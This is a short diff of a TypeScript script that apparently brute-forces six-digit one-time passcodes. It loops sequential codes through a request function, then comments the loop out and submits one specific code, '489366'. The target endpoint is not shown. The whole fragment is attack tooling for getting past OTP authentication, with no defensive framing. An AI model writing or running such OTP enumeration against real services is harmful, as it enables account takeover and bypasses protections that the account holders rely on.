@@ -26,12 +26,17 @@ async function sendRequest(otp: string) {
   }
 }
 
-// Generate and fire 1000 OTPs
+// Generate and fire 100 OTPs
+/*
 async function spamOTPs() {
-  for (let i = 0; i < 1000; i++) {
-    const otp = (100000 + i).toString(); // generates 6-digit OTPs: 100000, 100001, ...
-    await sendRequest(otp); // sequential — can change to parallel below
+  for (let i = 0; i < 100; i++) {
+    const otp = (100000 + i).toString();
+    await sendRequest(otp);
   }
 }
 
 spamOTPs();
+*/
+
+// Send request with the specific OTP: 489366
+sendRequest("489366");
